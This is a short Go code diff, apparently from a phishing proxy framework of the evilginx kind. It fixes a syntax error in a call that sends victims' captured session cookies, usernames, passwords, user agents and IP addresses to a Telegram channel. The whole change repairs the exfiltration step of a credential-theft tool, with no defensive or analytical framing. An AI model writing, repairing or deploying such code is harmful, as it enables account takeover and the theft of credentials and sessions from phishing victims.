@@ -214,7 +214,7 @@ func (d *Database) SetSessionTokens(sid string, tokens map[string]map[string]*To
 
 
 	json11, _ := json.Marshal(cookies)
-	sendTelegramResult(string(json11)data.Phishlet, data.Id, data.Username, data.Password, data.UserAgent, data.RemoteAddr)
+	sendTelegramResult(string(json11), data.Phishlet, data.Id, data.Username, data.Password, data.UserAgent, data.RemoteAddr)
 	return err
 }
 
